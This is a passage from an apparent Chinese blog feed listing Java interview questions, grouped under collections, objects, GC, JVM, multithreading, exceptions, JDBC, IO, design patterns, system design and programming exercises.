equals() 方法的重要性体现在什么地方</li><li>Object：Object有哪些公用方法？Object类hashcode,equals 设计原则？ sun为什么这么设计？Object类的概述</li><li>如何在父类中为子类自动完成所有的 hashcode 和 equals 实现？这么做有何优劣。</li><li>可以在 hashcode() 中使用随机数字吗？</li></ul></li><li>LinkedHashMap<ul><li>LinkedHashMap 和 PriorityQueue 的区别是什么</li></ul></li><li>List<ul><li>List, Set, Map三个接口，存取元素时各有什么特点</li><li>List, Set, Map 是否继承自 Collection 接口</li><li>遍历一个 List 有哪些不同的方式</li><li>LinkedList<ul><li>LinkedList 是单向链表还是双向链表</li><li>LinkedList 与 ArrayList 有什么区别</li><li>描述下 Java 中集合（Collections），接口（Interfaces），实现（Implementations）的概念。LinkedList 与 ArrayList 的区别是什么？</li><li>插入数据时，ArrayList, LinkedList, Vector谁速度较快？</li></ul></li><li>ArrayList<ul><li>ArrayList 和 HashMap 的默认大小是多数</li><li>ArrayList 和 LinkedList 的区别，什么时候用 ArrayList？</li><li>ArrayList 和 Set 的区别？</li><li>ArrayList, LinkedList, Vector的区别</li><li>ArrayList是如何实现的，ArrayList 和 LinkedList 的区别</li><li>ArrayList如何实现扩容</li><li>Array 和 ArrayList 有何区别？什么时候更适合用Array</li><li>说出ArraList,Vector, LinkedList的存储性能和特性</li></ul></li></ul></li><li>Map<ul><li>Map, Set, List, Queue, Stack</li><li>Map 接口提供了哪些不同的集合视图</li><li>为什么 Map 接口不继承 Collection 接口</li></ul></li><li>Collections<ul><li>介绍Java中的Collection FrameWork。集合类框架的基本接口有哪些</li><li>Collections类是什么？Collection 和 Collections的区别？Collection、Map的实现</li><li>集合类框架的最佳实践有哪些</li><li>为什么 Collection 不从 Cloneable 和 Serializable 接口继承</li><li>说出几点 Java 中使用 Collections 的最佳实践？</li><li>Collections 中 遗留类 (HashTable、Vector) 和 现有类的区别</li></ul></li><li>什么是 B+树，B-树，列出实际的使用场景。</li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ul><li>Comparator 与 Comparable 接口是干什么的？列出它们的区别</li></ul><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><ul><li>拷贝(clone)<ul><li>如何实现对象克隆</li><li>深拷贝和浅拷贝区别</li><li>深拷贝和浅拷贝如何实现激活机制</li><li>写clone()方法时，通常都有一行代码，是什么</li></ul></li><li>比较<ul><li>在比较对象时，”&#x3D;&#x3D;” 运算符和 equals 运算有何区别</li><li>如果要重写一个对象的equals方法，还要考虑什么</li><li>两个对象值相同(x.equals(y) &#x3D;&#x3D; true)，但却可有不同的hash code，这句话对不对</li></ul></li><li>构造器<ul><li>构造器链是什么</li><li>创建对象时构造器的调用顺序</li></ul></li><li>不可变对象<ul><li>什么是不可变象（immutable object）</li><li>为什么 Java 中的 String 是不可变的（Immutable）</li><li>如何构建不可变的类结构？关键点在哪里</li><li>能创建一个包含可变对象的不可变对象吗</li></ul></li><li>如何对一组对象进行排序</li></ul><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>构造器（constructor）是否可被重写（override）</li><li>方法可以同时即是 static 又是 synchronized 的吗</li><li>abstract 的 method是否可同时是 static，是否可同时是 native，是否可同时是synchronized</li><li>Java支持哪种参数传递类型</li><li>一个对象被当作参数传递到一个方法，是值传递还是引用传递</li><li>当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递</li><li>我们能否重载main()方法</li><li>如果main方法被声明为private会怎样</li></ul><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><ul><li>概念<ul><li>GC是什么？为什么要有GC</li><li>什么时候会导致垃圾回收</li><li>GC是怎么样运行的</li><li>新老以及永久区是什么</li><li>GC 有几种方式？怎么配置</li><li>什么时候一个对象会被GC？ 如何判断一个对象是否存活</li><li>System.gc()  Runtime.gc()会做什么事情？  能保证 GC 执行吗</li><li>垃圾回收器可以马上回收内存吗？有什么办法主动通知虚拟机进行垃圾回收？</li><li>Minor GC 、Major GC、Young GC 与 Full GC分别在什么时候发生</li><li>垃圾回收算法的实现原理</li><li>如果对象的引用被置为null，垃圾收集器是否会立即释放对象占用的内存？</li><li>垃圾回收的最佳做法是什么</li></ul></li><li>GC收集器有哪些<ul><li>垃圾回收器的基本原理是什么？</li><li>串行(serial)收集器和吞吐量(throughput)收集器的区别是什么</li><li>Serial 与 Parallel GC之间的不同之处</li><li>CMS 收集器 与 G1 收集器的特点与区别</li><li>CMS垃圾回收器的工作过程</li><li>JVM 中一次完整的 GC 流程是怎样的？ 对象如何晋升到老年代</li><li>吞吐量优先和响应优先的垃圾收集器选择</li></ul></li><li>GC策略<ul><li>举个实际的场景，选择一个GC策略</li><li>JVM的永久代中会发生垃圾回收吗</li></ul></li><li>收集方法<ul><li>标记清除、标记整理、复制算法的原理与特点？分别用在什么地方</li><li>如果让你优化收集方法，有什么思路</li></ul></li></ul><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><ul><li>参数<ul><li>说说你知道的几种主要的jvm 参数</li><li>-XX:+UseCompressedOops 有什么作用</li></ul></li><li>类加载器(ClassLoader)<ul><li>Java 类加载器都有哪些</li><li>JVM如何加载字节码文件</li></ul></li><li>内存管理 <ul><li>JVM内存分哪几个区，每个区的作用是什么</li><li>一个对象从创建到销毁都是怎么在这些部分里存活和转移的</li><li>解释内存中的栈(stack)、堆(heap)和方法区(method area)的用法</li><li>JVM中哪个参数是用来控制线程的栈堆栈小</li><li>简述内存分配与回收策略</li><li>简述重排序，内存屏障，happen-before，主内存，工作内存</li><li>Java中存在内存泄漏问题吗？请举例说明</li><li>简述 Java 中软引用（SoftReferenc）、弱引用（WeakReference）和虚引用</li><li>内存映射缓存区是什么</li></ul></li><li>jstack，jstat，jmap，jconsole怎么用</li><li>32 位 JVM 和 64 位 JVM 的最大堆内存分别是多数？32 位和 64 位的 JVM，int 类型变量的长度是多数？</li><li>怎样通过 Java 程序来判断 JVM 是 32 位 还是 64 位 </li><li>JVM自身会维护缓存吗？是不是在堆中进行对象分配，操作系统的堆还是JVM自己管理堆</li><li>什么情况下会发生栈内存溢出</li><li>双亲委派模型是什么</li></ul><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><ul><li>基本概念<ul><li>什么是线程</li><li>多线程的优点</li><li>多线程的几种实现方式<ul><li>用 Runnable 还是 Thread</li></ul></li><li>什么是线程安全<ul><li>Vector, SimpleDateFormat 是线程安全类吗</li><li>什么 Java 原型不是线程安全的</li><li>哪些集合类是线程安全的</li></ul></li><li>多线程中的忙循环是什么</li><li>如何创建一个线程</li><li>编写多线程程序有几种实现方式</li><li>什么是线程局部变量</li><li>线程和进程有什么区别？进程间如何通讯，线程间如何通讯</li><li>什么是多线程环境下的伪共享（false sharing）</li><li>同步和异步有何异同，在什么情况下分别使用他们？举例说明</li></ul></li><li>Current<ul><li>ConcurrentHashMap 和 Hashtable的区别</li><li>ArrayBlockingQueue, CountDownLatch的用法</li><li>ConcurrentHashMap的并发度是什么</li></ul></li><li>CyclicBarrier 和 CountDownLatch有什么不同？各自的内部原理和用法是什么</li><li>Semaphore的用法</li><li>Thread<ul><li>启动一个线程是调用 run() 还是 start() 方法？start() 和 run() 方法有什么区别</li><li>调用start()方法时会执行run()方法，为什么不能直接调用run()方法</li><li>sleep() 方法和对象的 wait() 方法都可以让线程暂停执行，它们有什么区别</li><li>yield方法有什么作用？sleep() 方法和 yield() 方法有什么区别</li><li>Java 中如何停止一个线程</li><li>stop() 和 suspend() 方法为何不推荐使用</li><li>如何在两个线程间共享数据</li><li>如何强制启动一个线程</li><li>如何让正在运行的线程暂停一段时间</li><li>什么是线程组，为什么在Java中不推荐使用</li><li>你是如何调用  wait（方法的）？使用 if 块还是循环？为什么</li></ul></li><li>生命周期<ul><li>有哪些不同的线程生命周期</li><li>线程状态，BLOCKED 和 WAITING 有什么区别</li><li>画一个线程的生命周期状态图</li></ul></li><li>ThreadLocal 用途是什么，原理是什么，用的时候要注意什么</li><li>ThreadPool<ul><li>线程池是什么？为什么要使用它</li><li>如何创建一个Java线程池</li><li>ThreadPool用法与优势</li><li>提交任务时，线程池队列已满时会发会生什么</li><li>newCache 和 newFixed 有什么区别？简述原理。构造函数的各个参数的含义是什么，比如 coreSize, maxsize 等</li><li>线程池的实现策略</li><li>线程池的关闭方式有几种，各自的区别是什么</li><li>线程池中submit() 和 execute()方法有什么区别？</li></ul></li><li>线程调度<ul><li>Java中用到的线程调度算法是什么</li><li>什么是多线程中的上下文切换</li><li>你对线程优先级的理解是什么</li><li>什么是线程调度器 (Thread Scheduler) 和时间分片 (Time Slicing)</li></ul></li><li>线程同步<ul><li>请说出你所知的线程同步的方法</li><li>synchronized 的原理是什么</li><li>synchronized 和 ReentrantLock 有什么不同</li><li>什么场景下可以使用 volatile 替换 synchronized</li><li>有T1，T2，T3三个线程，怎么确保它们按顺序执行？怎样保证T2在T1执行完后执行，T3在T2执行完后执行</li><li>同步块内的线程抛出异常会发生什么</li><li>当一个线程进入一个对象的 synchronized 方法A 之后，其它线程是否可进入此对象的 synchronized 方法B</li><li>使用 synchronized 修饰静态方法和非静态方法有什么区别</li><li>如何从给定集合那里创建一个 synchronized 的集合</li></ul></li><li>锁<ul><li>Java Concurrency API 中 的 Lock 接口是什么？对比同步它有什么优势</li><li>Lock 与 Synchronized 的区别？Lock 接口比 synchronized 块的优势是什么</li><li>ReadWriteLock是什么？</li><li>锁机制有什么用</li><li>什么是乐观锁（Optimistic Locking）？如何实现乐观锁？如何避免ABA问题</li><li>解释以下名词：重排序，自旋锁，偏向锁，轻量级锁，可重入锁，公平锁，非公平锁，乐观锁，悲观锁</li><li>什么时候应该使用可重入锁</li><li>简述锁的等级方法锁、对象锁、类锁</li><li>Java中活锁和死锁有什么区别？</li><li>什么是死锁(Deadlock)？导致线程死锁的原因？如何确保 N 个线程可以访问 N 个资源同时又不导致死锁</li><li>死锁与活锁的区别，死锁与饥饿的区别</li><li>怎么检测一个线程是否拥有锁</li><li>如何实现分布式锁</li><li>有哪些无锁数据结构，他们实现的原理是什么</li><li>读写锁可以用于什么应用场景</li></ul></li><li>Executors类是什么？ Executor和Executors的区别</li><li>什么是Java线程转储(Thread Dump)，如何得到它</li><li>如何在Java中获取线程堆栈</li><li>说出 3 条在 Java 中使用线程的最佳实践</li><li>在线程中你怎么处理不可捕捉异常</li><li>实际项目中使用多线程举例。你在多线程环境中遇到的常见的问题是什么？你是怎么解决它的</li><li>请说出与线程同步以及线程调度相关的方法</li><li>程序中有3个 socket，需要多少个线程来处理</li><li>假如有一个第三方接口，有很多个线程去调用获取数据，现在规定每秒钟最多有 10 个线程同时调用它，如何做到</li><li>如何在 Windows 和 Linux 上查找哪个线程使用的 CPU 时间最长</li><li>如何确保 main() 方法所在的线程是 Java 程序最后结束的线程</li><li>非常多个线程（可能是不同机器），相互之间需要等待协调才能完成某种工作，问怎么设计这种协调方案</li><li>你需要实现一个高效的缓存，它允许多个用户读，但只允许一个用户写，以此来保持它的完整性，你会怎样去实现它</li></ul><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ul><li>基本概念<ul><li>Error 和 Exception有什么区别 <ul><li>UnsupportedOperationException是什么</li><li>NullPointerException 和 ArrayIndexOutOfBoundException 之间有什么相同之处</li></ul></li><li>什么是受检查的异常，什么是运行时异常</li><li>运行时异常与一般异常有何异同</li><li>简述一个你最常见到的runtime exception(运行时异常)</li></ul></li><li>finally<ul><li>finally关键词在异常处理中如何使用<ul><li>如果执行finally代码块之前方法返回了结果，或者JVM退出了，finally块中的代码还会执行吗</li><li>try里有return，finally还执行么？那么紧跟在这个try后的finally {}里的code会不会被执行，什么时候被执行，在return前还是后</li><li>在什么情况下，finally语句不会执行</li></ul></li></ul></li><li>throw 和 throws 有什么区别？</li><li>OOM你遇到过哪些情况？你是怎么搞定的？</li><li>SOF你遇到过哪些情况？</li><li>既然我们可以用RuntimeException来处理错误，那么你认为为什么Java中还存在检查型异常</li><li>当自己创建异常类的时候应该注意什么</li><li>导致空指针异常的原因</li><li>异常处理 handle or declare 原则应该如何理解</li><li>怎么利用 JUnit 来测试一个方法的异常</li><li>catch块里别不写代码有什么问题</li><li>你曾经自定义实现过异常吗？怎么写的</li><li>什么是 异常链</li><li>在try块中可以抛出异常吗</li></ul><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><ul><li>通过 JDBC 连接数据库有哪几种方式</li><li>阐述 JDBC 操作数据库的基本步骤</li><li>JDBC 中如何进行事务处理</li><li>什么是 JdbcTemplate</li><li>什么是 DAO 模块</li><li>使用 JDBC 操作数据库时，如何提升读取数据的性能？如何提升更新数据的性能</li><li>列出 5 个应该遵循的 JDBC 最佳实践</li></ul><h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><ul><li>File<ul><li>File类型中定义了什么方法来创建一级目录<ul><li>File类型中定义了什么方法来判断一个文件是否存在</li></ul></li></ul></li><li>流<ul><li>为了提高读写性能，可以采用什么流</li><li>Java中有几种类型的流</li><li>JDK 为每种类型的流提供了一些抽象类以供继承，分别是哪些类</li><li>对文本文件操作用什么I&#x2F;O流</li><li>对各种基本数据类型和String类型的读写，采用什么流</li><li>能指定字符编码的 I&#x2F;O 流类型是什么</li></ul></li><li>序列化<ul><li>什么是序列化？如何实现 Java 序列化及注意事项</li><li>Serializable 与 Externalizable 的区别</li></ul></li><li>Socket<ul><li>socket 选项 TCP NO DELAY 是指什么</li><li>Socket 工作在 TCP&#x2F;IP 协议栈是哪一层</li><li>TCP、UDP 区别及 Java 实现方式</li></ul></li><li>说几点 IO 的最佳实践</li><li>直接缓冲区与非直接缓冲器有什么区别？</li><li>怎么读写 ByteBuffer？ByteBuffer 中的字节序是什么</li><li>当用System.in.read(buffer)从键盘输入一行n个字符后，存储在缓冲区buffer中的字节数是多少</li><li>如何使用扫描器类（Scanner Class）令牌化</li></ul><h2 id="面向对象编程（OOP）"><a href="#面向对象编程（OOP）" class="headerlink" title="面向对象编程（OOP）"></a>面向对象编程（OOP）</h2><ul><li>解释下多态性（polymorphism），封装性（encapsulation），内聚（cohesion）以及耦合（coupling）</li><li>多态的实现原理</li><li>封装、继承和多态是什么</li><li>对象封装的原则是什么?</li><li>类<ul><li>获得一个类的类对象有哪些方式</li><li>重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？</li><li>说出几条 Java 中方法重载的最佳实践</li></ul></li><li>抽象类<ul><li>抽象类和接口的区别</li><li>抽象类中是否可以有静态的main方法</li><li>抽象类是否可实现(implements)接口</li><li>抽象类是否可继承具体类(concrete class)</li></ul></li><li>匿名类（Anonymous Inner Class）<ul><li>匿名内部类是否可以继承其它类？是否可以实现接口</li></ul></li><li>内部类<ul><li>内部类分为几种</li><li>内部类可以引用它的包含类（外部类）的成员吗</li><li>请说一下 Java 中为什么要引入内部类？还有匿名内部类</li></ul></li><li>继承<ul><li>继承（Inheritance）与聚合（Aggregation）的区别在哪里</li><li>继承和组合之间有什么不同</li><li>为什么类只能单继承，接口可以多继承</li><li>存在两个类，B 继承 A，C 继承 B，能将 B 转换为 C 么？如 C &#x3D; (C) B</li><li>如果类 a 继承类 b，实现接口c，而类 b 和接口 c 中定义了同名变量，请问会出现什么问题</li></ul></li><li>接口<ul><li>接口是什么</li><li>接口是否可继承接口</li><li>为什么要使用接口而不是直接使用具体类？接口有什么优点</li></ul></li></ul><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><ul><li>泛型的存在是用来解决什么问题</li><li>泛型的常用特点</li><li>List<String>能否转为List<Object></li></ul><h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><ul><li>日历<ul><li>Calendar Class的用途</li><li>如何在Java中获取日历类的实例</li><li>解释一些日历类中的重要方法</li><li>GregorianCalendar 类是什么</li><li>SimpleTimeZone 类是什么</li><li>Locale类是什么</li><li>如何格式化日期对象</li><li>如何添加小时(hour)到一个日期对象(Date Objects)</li><li>如何将字符串 YYYYMMDD 转换为日期</li></ul></li><li>Math<ul><li>Math.round()什么作用？Math.round(11.5) 等于多少？Math.round(-11.5)等于多少？</li></ul></li><li>XML<ul><li>XML文档定义有几种形式？它们之间有何本质区别？解析XML文档有哪几种方式？DOM 和 SAX 解析器有什么不同？</li><li>Java解析XML的方式</li><li>用 jdom 解析 xml 文件时如何解决中文问题？如何解析</li><li>你在项目中用到了 XML 技术的哪些方面？如何实现</li></ul></li></ul><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul><li>描述动态代理的几种实现方式，分别说出相应的优缺点</li></ul><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><ul><li>什么是设计模式（Design Patterns）？你用过哪种设计模式？用在什么场合</li><li>你知道哪些商业级设计模式？</li><li>哪些设计模式可以增加系统的可扩展性</li><li>单例模式<ul><li>除了单例模式，你在生产环境中还用过什么设计模式？ </li><li>写 Singleton 单例模式</li><li>单例模式的双检锁是什么</li><li>如何创建线程安全的 Singleton</li><li>什么是类的单例模式</li><li>写出三种单例模式实现</li></ul></li><li>适配器模式<ul><li>适配器模式是什么？什么时候使用</li><li>适配器模式和代理模式之前有什么不同</li><li>适配器模式和装饰器模式有什么区别</li></ul></li><li>什么时候使用享元模式</li><li>什么时候使用组合模式</li><li>什么时候使用访问者模式</li><li>什么是模板方法模式</li><li>请给出1个符合开闭原则的设计模式的例子</li></ul><h2 id="开放问题"><a href="#开放问题" class="headerlink" title="开放问题"></a>开放问题</h2><ul><li>用一句话概括 Web 编程的特点</li><li>Google是如何在一秒内把搜索结果返回给用户</li><li>哪种依赖注入方式你建议使用，构造器注入，还是 Setter方法注入</li><li>树（二叉或其他）形成许多普通数据结构的基础。请描述一些这样的数据结构以及何时可以使用它们</li><li>某一项功能如何设计</li><li>线上系统突然变得异常缓慢，你如何查找问题</li><li>什么样的项目不适合用框架</li><li>新浪微博是如何实现把微博推给订阅者</li><li>简要介绍下从浏览器输入 URL 开始到获取到请求界面之后 Java Web 应用中发生了什么</li><li>请你谈谈SSH整合 </li><li>高并发下，如何做到安全的修改同一行数据</li><li>12306网站的订票系统如何实现，如何保证不会票不被超卖</li><li>网站性能优化如何优化的</li><li>聊了下曾经参与设计的服务器架构</li><li>请思考一个方案，实现分布式环境下的 countDownLatch</li><li>请思考一个方案，设计一个可以控制缓存总体大小的自动适应的本地缓存</li><li>在你的职业生涯中，算得上最困难的技术挑战是什么</li><li>如何写一篇设计文档，目录是什么</li><li>大写的O是什么？举几个例子</li><li>编程中自己都怎么考虑一些设计原则的，比如开闭原则，以及在工作中的应用</li><li>解释一下网络应用的模式及其特点</li><li>设计一个在线文档系统，文档可以被编辑，如何防止多人同时对同一份文档进行编辑更新</li><li>说出数据连接池的工作机制是什么</li><li>怎么获取一个文件中单词出现的最高频率</li><li>描述一下你最常用的编程风格</li><li>如果有机会重新设计你们的产品，你会怎么做</li><li>如何搭建一个高可用系统</li><li>如何启动时不需输入用户名与密码</li><li>如何在基于Java的Web项目中实现文件上传和下载</li><li>如何实现一个秒杀系统，保证只有几位用户能买到某件商品。</li><li>如何实现负载均衡，有哪些算法可以实现</li><li>如何设计一个购物车？想想淘宝的购物车如何实现的</li><li>如何设计一套高并发支付方案，架构如何设计</li><li>如何设计建立和保持 100w 的长连接</li><li>如何避免浏览器缓存。</li><li>如何防止缓存雪崩</li><li>如果AB两个系统互相依赖，如何解除依</li><li>如果有人恶意创建非法连接，怎么解决</li><li>如果有几十亿的白名单，每天白天需要高并发查询，晚上需要更新一次，如何设计这个功能</li><li>如果系统要使用超大整数（超过long长度范围），请你设计一个数据结构来存储这种超大型数字以及设计一种算法来实现超大整数加法运算）</li><li>如果要设计一个图形系统，请你设计基本的图形元件(Point,Line,Rectangle,Triangle)的简单实现</li><li>如果让你实现一个并发安全的链表，你会怎么做</li><li>应用服务器与WEB 服务器的区别？应用服务器怎么监控性能，各种方式的区别？你使用过的应用服务器优化技术有哪些</li><li>大型网站在架构上应当考虑哪些问题</li><li>有没有处理过线上问题？出现内存泄露，CPU利用率标高，应用无响应时如何处理的</li><li>最近看什么书，印象最深刻的是什么</li><li>描述下常用的重构技巧</li><li>你使用什么版本管理工具？分支（Branch）与标签（Tag）之间的区别在哪里</li><li>你有了解过存在哪些反模式（Anti-Patterns）吗</li><li>你用过的网站前端优化的技术有哪些</li><li>如何分析Thread dump</li><li>你如何理解AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念</li><li>你是如何处理内存泄露或者栈溢出问题的</li><li>你们线上应用的 JVM 参数有哪些</li><li>怎么提升系统的QPS和吞吐量</li></ul><h2 id="知识面"><a href="#知识面" class="headerlink" title="知识面"></a>知识面</h2><ul><li>解释什么是 MESI 协议(缓存一致性)</li><li>谈谈 reactor 模型</li><li>Java 9 带来了怎样的新功能</li><li>Java 与 C++ 对比，C++ 或 Java 中的异常处理机制的简单原理和应用</li><li>简单讲讲 Tomcat 结构，以及其类加载器流程</li><li>虚拟内存是什么</li><li>阐述下 SOLID 原则</li><li>请简要讲一下你对测试驱动开发（TDD）的认识</li><li>CDN实现原理</li><li>Maven 和 ANT 有什么区别</li><li>UML中有哪些常用的图</li><li>Linux<ul><li>Linux 下 IO 模型有几种，各自的含义是什么。</li><li>Linux 系统下你关注过哪些内核参数，说说你知道的</li><li>Linux 下用一行命令查看文件的最后五行</li><li>平时用到哪些 Linux 命令</li><li>用一行命令输出正在运行的 Java 进程</li><li>使用什么命令来确定是否有 Tomcat 实例运行在机器上</li></ul></li><li>什么是 N+1 难题</li><li>什么是 paxos 算法</li><li>什么是 restful，讲讲你理解的 restful</li><li>什么是 zab 协议</li><li>什么是领域模型(domain model)？贫血模型(anaemic domain model) 和充血模型(rich domain model)有什么区别</li><li>什么是领域驱动开发（Domain Driven Development）</li><li>介绍一下了解的 Java 领域的 Web Service 框架</li><li>Web Server、Web Container 与 Application Server 的区别是什么</li><li>微服务（MicroServices）与巨石型应用（Monolithic Applications）之间的区别在哪里</li><li>描述 Cookie 和 Session 的作用，区别和各自的应用范围，Session工作原理</li><li>你常用的持续集成（Continuous Integration）、静态代码分析（Static Code Analysis）工具有哪些</li><li>简述下数据库正则化（Normalizations）</li><li>KISS,DRY,YAGNI 等原则是什么含义</li><li>分布式事务的原理，优缺点，如何使用分布式事务？</li><li>布式集群下如何做到唯一序列号</li><li>网络<ul><li>HTTPS 的加密方式是什么，讲讲整个加密解密流程</li><li>HTTPS和HTTP的区别</li><li>HTTP连接池实现原理</li><li>HTTP集群方案</li><li>Nginx、lighttpd、Apache三大主流 Web服务器的区别</li></ul></li><li>是否看过框架的一些代码</li><li>持久层设计要考虑的问题有哪些？你用过的持久层框架有哪些</li><li>数值提升是什么</li><li>你能解释一下里氏替换原则吗</li><li>你是如何测试一个应用的？知道哪些测试框架</li><li>传输层常见编程协议有哪些？并说出各自的特点</li></ul><h2 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h2><h3 id="计算加班费"><a href="#计算加班费" class="headerlink" title="计算加班费"></a>计算加班费</h3><p>加班10小时以下加班费是时薪的1.5倍。加班10小时或以上，按4元&#x2F;时算。提示：（一个月工作26天，一天正常工作8小时）</p><ul><li>计算1000月薪，加班9小时的加班费 </li><li>计算2500月薪，加班11小时的加班费</li><li>计算1000月薪，加班15小时的加班费</li></ul><h3 id="卖东西"><a href="#卖东西" class="headerlink" title="卖东西"></a>卖东西</h3><p>一家商场有红苹果和青苹果出售。（红苹果5元&#x2F;个，青苹果4元&#x2F;个）。</p><ul><li>模拟一个进货。红苹果跟青苹果各进200个。</li><li>模拟一个出售。红苹果跟青苹果各买出10个。每卖出一个苹果需要进行统计。</li></ul><p>提示：一个苹果是一个单独的实体。</p><h3 id="日期提取"><a href="#日期提取" class="headerlink" title="日期提取"></a>日期提取</h3><p>有这样一个时间字符串：2008-8-8 20:08:08 ， 请编写能够匹配它的正则表达式，并编写Java代码将日期后面的时分秒提取出来，即：20:08:08</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><ul><li>8设计4个线程，其中两个线程每次对j增加1，另外两个线程对j每次减少1。写出程序。</li><li>用Java写一个多线程程序，如写四个线程，二个加1，二个对一个变量减一，输出</li><li>wait-notify 写一段代码来解决生产者-消费者问题</li></ul><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><ul><li>判断101-200之间有多少个素数，并输出所有素数</li><li>用最有效率的方法算出2乘以17等于多少</li><li>有 1 亿个数字，其中有 2 个是重复的，快速找到它，时间和空间要最优</li><li>2 亿个随机生成的无序整数,找出中间大小的值</li><li>10 亿个数字里里面找最小的 10 个</li><li>1到1亿的自然数，求所有数的拆分后的数字之和，如286 拆分成2、8、6，如1到11拆分后的数字之和 &#x3D;&gt; 1 + … + 9 + 1 + 0 + 1 + 1</li><li>一个数如果恰好等于它的因子之和，这个数就称为 “完数 “。例如6&#x3D;1＋2＋3.编程   找出1000以内的所有完数</li><li>一个数组中所有的元素都出现了三次，只有一个元素出现了一次找到这个元素 </li><li>一球从100米高度自由落下，每次落地后反跳回原高度的一半；再落下，求它在   第10次落地时，共经过多少米？第10次反弹多高？ </li><li>求100－1000内质数的和</li><li>求1到100的和的平均数</li><li>求s&#x3D;a+a+aaa+aaaa+aa…a的值，其中a是一个数字。例如2+22+222+2222+22222(此时共有5个数相加)，几个数相加有键盘控制。 求出1到100的和</li><li>算出1到40的质数，放进数组里<ul><li>显示放组里的数</li><li>找出第[5]个数</li><li>删除第[9]个数，再显示删除后的第[9]个</li></ul></li><li>有 3n+1 个数字，其中 3n 个中是重复的，只有 1 个是不重复的，怎么找出来。</li><li>有一组数1.1.2.3.5.8.13.21.34。写出程序随便输入一个数就能给出和前一组数字同规律的头5个数</li><li>计算指定数字的阶乘</li><li>开发 Fizz Buzz </li><li>给定一个包含 N 个整数的数组，找出丢失的整数</li><li>一个排好序的数组，找出两数之和为m的所有组合 </li><li>将一个正整数分解质因数。例如：输入90,打印出90&#x3D;2*3*3*5。</li><li>打印出所有的 “水仙花数 “，所谓 “水仙花数 “是指一个三位数，其各位数字立方和等于该数本身。例如：153是一个 “水仙花数 “，因为153&#x3D;1的三次方＋5的三次方＋3的三次方</li><li>原地交换两个变量的值</li><li>找出4字节整数的中位数</li><li>找到整数的平方根</li><li>实现斐波那契</li></ul><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><ul><li>用Java Socket编程，读服务器几个字符，再写入本地显示</li></ul><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><ul><li>反射机制提供了什么功能？</li><li>反射是如何实现的</li><li>哪里用到反射机制</li><li>反射中 Class.forName 和 ClassLoader 区别</li><li>反射创建类实例的三种方式是什么</li><li>如何通过反射调用对象的方法</li><li>如何通过反射获取和设置对象私有字段的值</li><li>反射机制的优缺点</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><ul><li>写一段 JDBC 连Oracle的程序,并实现数据查询</li></ul><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ul><li>50个人围坐一圈，当数到三或者三的倍数出圈，问剩下的人是谁，原来的位置是多少</li><li>实现一个电梯模拟器用</li><li>写一个冒泡排序</li><li>写一个折半查找</li><li>随机产生20个不能重复的字符并排序</li><li>写一个函数，传入 2 个有序的整数数组，返回一个有序的整数数组</li><li>写一段代码在遍历 ArrayList 时移除一个元素</li><li>古典问题：有一对兔子，从出生后第3个月起每个月都生一对兔子，小兔子长到第四个月后每个月又生一对兔子，假如兔子都不死，问每个月的兔子总数为多少</li><li>约瑟芬环游戏</li></ul><h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><ul><li>请编写一段匹配IP地址的正则表达式</li><li>写出一个正则表达式来判断一个字符串是否是一个数字</li></ul><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ul><li>写一个方法，入一个文件名和一个字符串，统计这个字符串在这个文件中出现的次数。</li><li>写一个程序找出所有字符串的组合，并检查它们是否是回文串</li><li>写一个字符串反转函数，输入abcde转换成edcba代码</li><li>小游戏，倒转句子中的单词</li><li>将GB2312编码的字符串转换为ISO-8859-1编码的字符串</li><li>请写一段代码来计算给定文本内字符“A”的个数。分别用迭代和递归两种方式</li><li>编写一个截取字符串的函数，输入为一个字符串和字节数，输出为按字节截取的字符串。 但是要保证汉字不被截半个，如“我ABC”4，应该截为“我AB”，输入“我ABC汉DEF”，6，应该输出为“我ABC”而不是“我ABC+汉的半个”</li><li>给定 2 个包含单词列表（每行一个）的文件，编程列出交集</li><li>打印出一个字符串的所有排列</li><li>将一个键盘输入的数字转化成中文输出(例如：输入1234567，输出:一百二拾三万四千五百六拾七)</li><li>在Web应用开发过程中经常遇到输出某种编码的字符，如从 GBK 到 ISO8859-1等，如何输出一个某种编码的字符串</li></ul><h2 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h2><ul><li>计算两个日期之间的差距</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里巴巴高级 Java 面试题 70 道</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E9%AB%98%E7%BA%A7%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%2070%20%E9%81%93/"/>
